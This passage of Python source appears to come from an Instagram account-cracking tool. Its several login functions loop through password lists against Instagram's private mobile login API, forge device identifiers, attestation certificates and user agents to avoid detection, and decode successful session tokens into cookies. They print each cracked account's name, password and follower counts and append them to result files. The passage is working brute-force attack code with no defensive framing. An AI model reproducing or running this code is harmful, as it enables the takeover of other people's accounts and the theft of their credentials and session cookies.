						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {h}[{P}●{h}]{P} Target Data Information")
				print(f"     {h}＼{P} Fullnames :{h} {fullname} ")
				print(f"     {h}＼{P} Usernames :{h} {username} ")
				print(f"     {h}＼{P} Passwords :{h} {password} ")
				print(f"     {h}＼{P} Followers :{h} {peng} ")
				print(f"     {h}＼{P} Following :{h} {meng} ")
				print(f"     {h}＼{P} Mycookies :{h} {cookies} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {uag}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

class CrackInitConfig:
	def __init__(self):
		pass

	def Android_ID(self, users, passwd):
		self.xyz = hashlib.md5()
		self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
		self.hex = self.xyz.hexdigest()
		self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
		return self.xyz.hexdigest()
	
	def bloks_version_id(self):
		return random.choice(['16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf','9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a','c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49','edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'])
    
	def generate_random_nav_chain(self):
		return f'com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:{str(time.time())[:14]}::'

	def x_signature(self, x_params, bk=None):
		self.bk_client_context = '{"bloks_version":"'+bk+'","styles_id":"instagram"}'
		self.bloks_versioning_id = bk
		return 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(x_params),urllib.parse.quote(self.bk_client_context),self.bloks_versioning_id)


	def headersINIT(self):
		return {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': 'UFS-fc69169a-4ae0-41f5-9b94-90a83b549d51-1',
            'x-pigeon-rawclienttime': '1737820822.382',
            'x-ig-bandwidth-speed-kbps': '-1.000',
            'x-ig-bandwidth-totalbytes-b': '0',
            'x-ig-bandwidth-totaltime-ms': '0',
            'x-bloks-version-id': '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf',
            'x-ig-www-claim': '0',
            'x-bloks-prism-button-version': 'CONTROL',
            'x-ig-attest-params': json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[0],"challenge_nonce":'',"signed_nonce":"MEYCIQD2SNX76jQyLJvVkrd_uku1-SZPHcBZXwVyhyDK658ULAIhAJYS12MOmjzh1xmAAEgDpqDE7g11-slWbnlIP8ZPLZvv","key_hash":"24dd06882320a2722e97178ff94b9721801ca6941714f3287b8d26277d4a4402","certificate_chain":"-----BEGIN CERTIFICATE-----\nMIICYTCCAgagAwIBAgIBATAKBggqhkjOPQQDAjApMRkwFwYDVQQFExBhYzhjYzdkNTg0ZTVkZGM1\nMQwwCgYDVQQMDANURUUwHhcNNzAwMTAxMDAwMDAwWhcNNDkxMjMxMjM1OTU5WjAfMR0wGwYDVQQD\nDBRBbmRyb2lkIEtleXN0b3JlIEtleTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABGNMykUMPdce\nGXpm+AIfDxW5Z+ofMt2GrLMoVHJ6m70fc62OE00856q+bTWYnn6sv5IeR9y\/ZL3aKh9FOTBEPTij\nggEnMIIBIzAPBgNVHQ8BAf8EBQMDB4AAMIIBDgYKKwYBBAHWeQIBEQSB\/zCB\/AIBAgoBAQIBAwoB\nAQQgMHY4THRXVnFkeU5zcENrOXdVY2VCVGpYUmZBSjNaNDcEADBav4U9CQIHBiyJ6q1DFL+FRUkE\nRzBFMR8wHQQVY29tLmluc3RhZ3JhbS5hbmRyb2lkAgQWawHeMSIEIOw6UW9yauA8m\/9DvK2357Yx\nlaM\/dRIMnML7+h3jwYQIMG6hCDEGAgEDAgECogMCAQOjBAICAQClBTEDAgEEqgMCAQG\/g3cCBQC\/\nhT4DAgEAv4VAKjAoBCBd50Kks6Kd4utquLqZnjaovgfi9zw8pYOfssGupCrNugEB\/woBAL+FQQUC\nAwGtsL+FQgUCAwMV3TAKBggqhkjOPQQDAgNJADBGAiEAkRyLNKI9Bs7ogu4TfFp79FJG5iBxjGXc\nHmPQlUw5OMICIQCplX5ElzGbx+gH13A4Po7ycuNDtovFF5G5aHHrhMRPAg==\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIICJTCCAaugAwIBAgIKB4RAUiQ1I2kQeTAKBggqhkjOPQQDAjApMRkwFwYDVQQFExA0ZDc0YTBl\nMDFhYWYzZGRmMQwwCgYDVQQMDANURUUwHhcNMTgwMzIxMjEyNTE0WhcNMjgwMzE4MjEyNTE0WjAp\nMRkwFwYDVQQFExBhYzhjYzdkNTg0ZTVkZGM1MQwwCgYDVQQMDANURUUwWTATBgcqhkjOPQIBBggq\nhkjOPQMBBwNCAAQXcs+bS7tpA\/5rq2RDu+FsH5uPPcBCe9vUgV64ZZliHI9KNP7N8menanGIL7cC\npN+Oa0lrjLeJr66DDBZaml+zo4G6MIG3MB0GA1UdDgQWBBTusYTCIy+5aj+TrmfWx4x7F3CgWjAf\nBgNVHSMEGDAWgBSptfQpyRpYvS+YLWdzMQaH4N\/NYjAPBgNVHRMBAf8EBTADAQH\/MA4GA1UdDwEB\n\/wQEAwICBDBUBgNVHR8ETTBLMEmgR6BFhkNodHRwczovL2FuZHJvaWQuZ29vZ2xlYXBpcy5jb20v\nYXR0ZXN0YXRpb24vY3JsLzA3ODQ0MDUyMjQzNTIzNjkxMDc5MAoGCCqGSM49BAMCA2gAMGUCMEkH\njioGchBz3hw9OqeYL5D4Y5dU+Q7UO5ah7LAcLh65io0mnyWqnZuAwjpZVik8EgIxAOhgqXNuwsAG\nGCQxkuGc+Znkkr7wu4RjXmmRoEULcNA\/mc3j6oaaLqedvpSwRrRmwA==\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIID0TCCAbmgAwIBAgIKA4gmZ2BliZaFfzANBgkqhkiG9w0BAQsFADAbMRkwFwYDVQQFExBmOTIw\nMDllODUzYjZiMDQ1MB4XDTE4MDMyMTIxMTQxNFoXDTI4MDMxODIxMTQxNFowKTEZMBcGA1UEBRMQ\nNGQ3NGEwZTAxYWFmM2RkZjEMMAoGA1UEDAwDVEVFMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAE1fUO\n4o3zM0pqd5CcwiXIijKuO7ScSpUiDLoKdsrLJAyEOoN2BCMxOqCCgCZl\/S9E9JbYt9ysVTR0QQ0N\nf73j9CjfdEoXTeeymyskwJ5WAFK7dbDVakEWCM4y24+LIHNyo4G2MIGzMB0GA1UdDgQWBBSptfQp\nyRpYvS+YLWdzMQaH4N\/NYjAfBgNVHSMEGDAWgBQ2YeEAfIgFCVGLRGxH\/xpMyepPEjAPBgNVHRMB\nAf8EBTADAQH\/MA4GA1UdDwEB\/wQEAwICBDBQBgNVHR8ESTBHMEWgQ6BBhj9odHRwczovL2FuZHJv\naWQuZ29vZ2xlYXBpcy5jb20vYXR0ZXN0YXRpb24vY3JsL0U4RkExOTYzMTREMkZBMTgwDQYJKoZI\nhvcNAQELBQADggIBADLOBMxNgq0d3qXP4hqjefftiB4OZ478vnsEtyZZypVHihA\/5RQZ7NTbM8Oh\nUfUGXjBmH9JYLxQDezWDhkbc7gQwoQ\/EFsmOY9DaXLD3PiG2pQQHWgGMMR8+Oq+NMT62EhTwDSzM\nbLh6v9JrXyew\/8Cq3t72MW3zlcLUkNyCTyQNhfK7xFjJ+t2WQSsfTBAcmldVD2L8jaLKhHsWYOhi\nzpKFE\/Bjg9hbqHR4tSjbbMluhYVSP9hnrvQJvs+Mf3KyyJPG0vM4dHEi1pJ2sa4UWgnYrx2vSCJc\nMIWOwv5hr8PSTJJTpHUfeOr8+sTKTmdoH32yXuqKscy2kmT4gsCL3CToVyAzbRczDctwAovl430s\nmDIAILS97omqZhM0nZyP3hYJkUmAUFc5rjUB4iWOFwjg8HeYnQpP0nbaxFFFMovhq+4QFvaVfTJ2\nsrUZZ3P+wMap0qkj8Cv8sbbsPhFgpCLH\/yXD7WxreQI9XWI22TLkbkdnhYsjCtUe0PQXHcw\/X9oS\n4jUlUsLWlD6DYFX4jVT1R284AzvXmpSKO5+SaQ\/NuPRieCJH4K7t\/fbkxYwOtRixRjpvvd5QPxw1\nKPntHugVMan3sZ3hNIEgHyLUt8ZZi5CY36a5qI5sFVVcQZaCDalfqfN3He5rTJTGxpt4WwO9qYfd\nJARwzmxS5iFjbShs\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIFYDCCA0igAwIBAgIJAOj6GWMU0voYMA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAUTEGY5MjAw\nOWU4NTNiNmIwNDUwHhcNMTYwNTI2MTYyODUyWhcNMjYwNTI0MTYyODUyWjAbMRkwFwYDVQQFExBm\nOTIwMDllODUzYjZiMDQ1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr7bHgiuxpwHs\nK7Qui8xUFmOr75gvMsd\/dTEDDJdSSxtf6An7xyqpRR90PL2abxM1dEqlXnf2tqw1Ne4Xwl5jlRfd\nnJLmN0pTy\/4lj4\/7tv0Sk3iiKkypnEUtR6WfMgH0QZfKHM1+di+y9TFRtv6y\/\/0rb+T+W8a9nsNL\n\/ggjnar86461qO0rOs2cXjp3kOG1FEJ5MVmFmBGtnrKpa73XpXyTqRxB\/M0n1n\/W9nGqC4FSYa04\nT6N5RIZGBN2z2MT5IKGbFlbC8UrW0DxW7AYImQQcHtGl\/m00QLVWutHQoVJYnFPlXTcHYvASLu+R\nhhsbDmxMgJJ0mcDpvsC4PjvB+TxywElgS70vE0XmLD+OJtvsBslHZvPBKCOdT0MS+tgSOIfga+z1\nZ1g7+DVagf7quvmag8jfPioyKvxnK\/EgsTUVi2ghzq8wm27ud\/mIM7AY2qEORR8Go3TVB4HzWQgp\nZrt3i5MIlCaY504LzSRiigHCzAPlHws+W0rB5N+er5\/2pJKnfBSDiCiFAVtCLOZ7gLiMm0jhO2B6\ntUXHI\/+MRPjy02i59lINMRRev56GKtcd9qO\/0kUJWdZTdA2XoS82ixPvZtXQpUpuL12ab+9EaDK8\nZ4RHJYYfCT3Q5vNAXaiWQ+8PTWm2QgBR\/bkwSWc+NpUFgNPN9PvQi8WEg5UmAGMCAwEAAaOBpjCB\nozAdBgNVHQ4EFgQUNmHhAHyIBQlRi0RsR\/8aTMnqTxIwHwYDVR0jBBgwFoAUNmHhAHyIBQlRi0Rs\nR\/8aTMnqTxIwDwYDVR0TAQH\/BAUwAwEB\/zAOBgNVHQ8BAf8EBAMCAYYwQAYDVR0fBDkwNzA1oDOg\nMYYvaHR0cHM6Ly9hbmRyb2lkLmdvb2dsZWFwaXMuY29tL2F0dGVzdGF0aW9uL2NybC8wDQYJKoZI\nhvcNAQELBQADggIBACDIw41L3KlXG0aMiS\/\/cqrG+EShHUGo8HNsw30W1kJtjn6UBwRM6jnmiwfB\nPb8VA91chb2vssAtX2zbTvqBJ9+LBPGCdw\/E53Rbf86qhxKaiAHOjpvAy5Y3m00mqC0w\/Zwvju1t\nwb4vhLaJ5NkUJYsUS7rmJKHHBnETLi8GFqiEsqTWpG\/6ibYCv7rYDBJDcR9W62BW9jfIoBQcxUCU\nJouMPH25lLNcDc1ssqvC2v7iUgI9LeoM1sNovqPmQUiG9rHli1vXxzCyaMTjwftkJLkf6724DFhu\nKug2jITV0QkXvaJWF4nUaHOTNA4uJU9WDvZLI1j83A+\/xnAJUucIv\/zGJ1AMH2boHqF8CY16LpsY\ngBt6tKxxWH00XcyDCdW2KlBCeqbQPcsFmWyWugxdcekhYsAWyoSf818NUsZdBWBaR\/OukXrNLfkQ\n79IyZohZbvabO\/X+MVT3rriAoKc8oE2Uws6DF+60PV7\/WIPjNvXySdqspImSN78mflxDqwLqRBYk\nA3I75qppLGG9rp7UCdRjxMl8ZDBld+7yvHVgt1cVzJx9xnyGCC23UaicMDSXYrB4I4WHXPGjxhZu\nCuPBLTdOLU8YRvMYdEvYebWHMpvwGCF6bAx3JBpIeOQ1wDB5y0USicV3YgYGmi+NZfhA4URSh77Y\nd6uuJOJENRaNVTzk\n-----END CERTIFICATE-----"}]}),
            'x-bloks-prism-colors-enabled': 'false',
            'x-bloks-prism-ax-base-colors-enabled': 'false',
            'x-bloks-prism-font-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': 'abfbefdc-a663-4478-9aed-86b26eb10e15',
            'x-ig-family-device-id': '7a8592f5-cebe-4fce-a105-ce662a60834f',
            'x-ig-android-id': 'android-1527e6994a325583',
            'x-ig-timezone-offset': str(-time.timezone),
            'x-ig-nav-chain': 'com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:1737820721.929::,com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:2:button:1737820726.392::',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'x-ig-app-id': '567067343352427',
            'priority': 'u=3',
            'user-agent': 'Instagram 361.0.0.46.88 Android (30/11; 320dpi; 720x1406; vivo; vivo 1904; 1904; mt6762; in_ID; 674674275)',
            'accept-language': 'id-ID, en-US',
            'x-mid': x_mid(''),
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True'
        }

def THReadsInitLogin(user, passwordlist):
	global Ok, Cp, Loop
	print(f" {h}[{P}●{h}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {h}{Ok} {P}Failed {k}{Cp}", end="\r")
	for password in passwordlist:
		try:
			threads_config = {
                'android_id': 'android-{}'.format(CrackInitConfig().Android_ID(user,password)[:16]),
                'family': str(uuid.uuid4()),
                'device': str(uuid.uuid4()),
                'bloks': CrackInitConfig().bloks_version_id(),
                'wartefall': str(uuid.uuid4()),
                'request_ts': str(time.time()),
                'ps': str(uuid.uuid4())
            }
			headers_threads = CrackInitConfig().headersINIT()
			headers_threads.update({
				'x-pigeon-session-id': f'UFS-{threads_config["ps"]}-1',
            	'x-pigeon-rawclienttime': threads_config['request_ts'][:14],
            	'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
            	'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
            	'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
            	'x-ig-app-id': '3419628305025917',
            	'x-bloks-version-id': threads_config['bloks'],
            	'x-ig-device-id': threads_config['device'],
            	'x-ig-family-device-id': threads_config['family'],
            	'x-ig-android-id': threads_config['android_id'],
            	'x-ig-nav-chain': CrackInitConfig().generate_random_nav_chain(),
            	'user-agent': UserAgentBarcelona()
			})
			params = f'params=%7B%22client_input_params%22%3A%7B%22sim_phones%22%3A%5B%5D%2C%22secure_family_device_id%22%3A%22%22%2C%22has_granted_read_contacts_permissions%22%3A0%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A0%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{threads_config["request_ts"][:10]}%3A{password}%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22event_flow%22%3A%22login_manual%22%2C%22password_contains_non_ascii%22%3A%22false%22%2C%22client_known_key_hash%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22has_granted_read_phone_permissions%22%3A0%2C%22app_manager_id%22%3A%22%22%2C%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22{threads_config["android_id"]}%22%2C%22login_attempt_count%22%3A1%2C%22machine_id%22%3A%22{headers_threads["x-mid"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22family_device_id%22%3A%22{threads_config["family"]}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%22{user}%40gmail.com%22%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22contact_point%22%3A%22{user}%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{threads_config["wartefall"]}%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%22pp46el%3A72%22%2C%22is_from_empty_password%22%3A0%2C%22is_from_msplit_fallback%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22username_text_input_id%22%3A%22pp46el%3A71%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22{threads_config["android_id"]}%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A1.55383972500153E14%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%22{threads_config["family"]}%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%22{threads_config["bloks"]}%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id={threads_config["bloks"]}'
			response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=params,headers=headers_threads)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				username = user
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {h}[{P}●{h}]{P} Target Data Information")
				print(f"     {h}＼{P} Fullnames :{h} {fullname} ")
				print(f"     {h}＼{P} Usernames :{h} {username} ")
				print(f"     {h}＼{P} Passwords :{h} {password} ")
				print(f"     {h}＼{P} Followers :{h} {peng} ")
				print(f"     {h}＼{P} Following :{h} {meng} ")
				print(f"     {h}＼{P} Mycookies :{h} {cookies} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(user)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				username = user
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {headers_threads['user-agent']}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
		# except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop+=1

def ManualInitLogin(users,passwordlist):
	global Ok, Cp, Loop
	print(f" {h}[{P}●{h}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {h}{Ok} {P}Failed {k}{Cp}", end="\r")

	for password in passwordlist:
		try:
			threads_config = {
                'android_id': 'android-{}'.format(CrackInitConfig().Android_ID(users,password)[:16]),
                'family': str(uuid.uuid4()),
                'device': str(uuid.uuid4()),
                'bloks': CrackInitConfig().bloks_version_id(),
                'wartefall': str(uuid.uuid4()),
                'request_ts': str(time.time()),
                'ps': str(uuid.uuid4())
            }
			headers_threads = CrackInitConfig().headersINIT()
			headers_threads.update({
                'x-pigeon-session-id': f'UFS-{threads_config["ps"]}-0',
                'x-pigeon-rawclienttime': threads_config['request_ts'][:14],
                'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
                'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
                'x-bloks-version-id': threads_config['bloks'],
                'x-ig-device-id': threads_config['device'],
                'x-ig-family-device-id': threads_config['family'],
                'x-ig-android-id': threads_config['android_id'],
                'x-ig-nav-chain': CrackInitConfig().generate_random_nav_chain(),
                'user-agent':  UserAgentBarcelona()
            })
			v = '#PWD_INSTAGRAM:0:{}:{}'.format(int(time.time()), password)
			params = '{"client_input_params":{"device_id":"android-'+threads_config['android_id']+'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'+ headers_threads['x-mid'] +'","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":1,"password":"'+v+'","sso_token_map_json_string":"","family_device_id":"'+str(threads_config['family'])+'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+users+'","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":null,"login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"offline_experiment_group":null,"is_from_landing_page":0,"password_text_input_id":"of3xfo:64","is_from_empty_password":0,"ar_event_source":"login_home_page","username_text_input_id":"of3xfo:63","layered_homepage_experiment_group":null,"should_show_nested_nta_from_aymh":1,"device_id":null,"INTERNAL__latency_qpl_instance_id":1.47656576400177E14,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":null,"INTERNAL_INFRA_THEME":"harm_f","access_flow_version":"LEGACY_FLOW","is_from_logged_in_switcher":0}}'
			payload_manual = CrackInitConfig().x_signature(params, threads_config['bloks'])
			response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=payload_manual, headers=headers_threads)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				username = users
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {h}[{P}●{h}]{P} Target Data Information")
				print(f"     {h}＼{P} Fullnames :{h} {fullname} ")
				print(f"     {h}＼{P} Usernames :{h} {username} ")
				print(f"     {h}＼{P} Passwords :{h} {password} ")
				print(f"     {h}＼{P} Followers :{h} {peng} ")
				print(f"     {h}＼{P} Following :{h} {meng} ")
				print(f"     {h}＼{P} Mycookies :{h} {cookies} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(users)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				username = users
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {headers_threads['user-agent']}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
             
		# except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop +=1
	
def SmartLockGoogle(users,passwordlist):
	global Ok, Cp, Loop
	print(f" {h}[{P}●{h}]{P} Smartlock {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {h}{Ok} {P}Failed {k}{Cp}", end="\r")
	for password in passwordlist:
		try:
			threads_config = {
                    'android_id': 'android-{}'.format(CrackInitConfig().Android_ID(users,password)[:16]),
                    'family': str(uuid.uuid4()),
                    'device': str(uuid.uuid4()),
                    'bloks': CrackInitConfig().bloks_version_id(),
                    'wartefall': str(uuid.uuid4()),
                    'request_ts': str(time.time()),
                    'ps': str(uuid.uuid4())
                }
			headers_threads = CrackInitConfig().headersINIT()
			headers_threads.update({
                    'x-pigeon-session-id': f'UFS-{threads_config["ps"]}-0',
                    'x-pigeon-rawclienttime': threads_config['request_ts'][:14],
                    'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
                    'x-bloks-version-id': threads_config['bloks'],
                    'x-ig-device-id': threads_config['device'],
                    'x-ig-family-device-id': threads_config['family'],
                    'x-ig-android-id': threads_config['android_id'],
                    'x-ig-nav-chain': CrackInitConfig().generate_random_nav_chain(),
                    'user-agent': UserAgentBarcelona()
                })
			params = {
                   'params': '{"client_input_params":{"device_id":"'+ threads_config['android_id'] +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(users)+'","machine_id":"'+str(headers_threads['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(users)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(password)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                   'bk_client_context': '{"bloks_version":"'+threads_config['bloks']+'","styles_id":"instagram"}',
                   'bloks_versioning_id': threads_config['bloks'],
                }
			response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=params,headers=headers_threads)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				username = users
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {h}[{P}●{h}]{P} Target Data Information")
				print(f"     {h}＼{P} Fullnames :{h} {fullname} ")
				print(f"     {h}＼{P} Usernames :{h} {username} ")
				print(f"     {h}＼{P} Passwords :{h} {password} ")
				print(f"     {h}＼{P} Followers :{h} {peng} ")
